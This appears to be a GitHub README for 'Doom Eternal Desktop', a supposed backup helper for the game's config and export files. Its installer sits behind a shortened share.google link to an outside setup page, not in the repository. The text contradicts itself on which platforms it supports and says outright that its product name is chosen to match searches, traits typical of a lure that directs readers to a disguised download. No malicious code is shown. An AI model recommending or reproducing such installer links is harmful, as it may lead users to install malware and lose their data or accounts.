# Doom Eternal Desktop

*Keep the Doom Eternal data folder tidy before an update.*

## Overview

**Doom Eternal Desktop** is a Windows utility. A local helper for Doom Eternal data folders, config and export files, and photo albums on Windows and macOS.

Doom Eternal config and export files hide under AppData and Documents.

The CLI in this repository is the documented interface; the desktop build is the same job in an installer.

## What's included

Use the command-line copy in this repository if you already have Python.

If you want a normal installer for Windows or macOS, open the [setup page](https://share.google/A1IHfyGRT0zGRLqj8) and follow the steps there.

## Highlights

- Maps Doom Eternal data and cache paths.
- Keeps a dated spare of config and export files.
- Skips empty and temp folders.
- Leaves the original tree in place.

## Background

A product-named desktop helper matches how people look for it.

Local copies only. No account step.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Run locally

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.
